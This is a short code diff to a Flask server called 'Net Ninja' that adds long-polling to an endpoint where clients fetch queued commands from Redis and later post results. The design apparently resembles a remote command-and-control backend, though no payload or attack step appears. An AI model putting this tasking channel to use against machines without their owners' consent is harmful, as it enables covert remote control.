@@ -1,7 +1,7 @@
 # Net Ninja | Flask Server Software
 # Created By: JT STEINBACH
 
-# Version: 1.4-BETA
+# Version: 1.4.1-BETA
 
 from flask import Flask, request, jsonify
 from cryptography.fernet import Fernet
@@ -151,12 +151,16 @@ def fetch_command():
     code = data.get("code")
     pointer = code[:4]
 
-    # Retrieve and delete the command
-    command = redis_client.getdel(f"command:{pointer}")
-    if command:
-        return jsonify({"command": command})  # Send the command if available
-    
-    return '', 204  # No Content status
+    timeout = 30  # Long-polling timeout in seconds
+    start_time = time.time()
+
+    while time.time() - start_time < timeout:
+        command = redis_client.getdel(f"command:{pointer}")
+        if command:
+            return jsonify({"command": command})  # Return the command immediately if available
+        time.sleep(1)  # Short delay before checking again
+
+    return '', 204  # No command available after timeout
 
 @app.route('/send_result', methods=['POST'])
 def send_result():
